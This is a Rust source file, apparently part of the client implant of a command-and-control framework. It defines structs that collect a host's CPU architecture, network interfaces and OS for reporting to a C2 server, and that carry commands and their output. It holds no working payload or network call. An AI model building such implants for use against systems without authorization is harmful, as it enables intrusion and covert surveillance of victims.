use crate::worker::sys_info::{get_network_info, get_cpu_arch, get_os};
use serde::{Serialize, Deserialize};

/// Represents the configuration of the client system.
///
/// Includes information about the system's architecture, network interfaces,
/// and operating system.
/// This struct is used to serialize and send the client's system information
/// to the server.
#[derive(Serialize, Deserialize)]
pub struct Config {
    pub arch: String,
    pub network_info: Vec<(String, String)>,
    pub os: String,
}

impl Config {
    pub fn new() -> Self {
        Self {
            arch: get_cpu_arch(),
            network_info: get_network_info(),
            os: get_os(),
        }
    }

    /// Serializes the `Config` instance to a JSON string.
    ///
    /// # Returns
    ///
    /// Returns a `serde_json::Result<String>` which is `Ok` containing the
    /// JSON string if serialization is successful, or an `Err` with a
    /// serialization error.
    pub fn to_json(&self) -> serde_json::Result<String> {
        serde_json::to_string(&self)
    }
}

/// Represents a command received from the Command and Control (C2) server.
///
/// This struct is used to deserialize commands received from the server, as
/// well as to serialize the output or results of the command execution back
/// to the server.
#[derive(Serialize, Deserialize, Debug)]
pub struct C2Command {
    pub name: String,
    pub output: Option<String>,
}

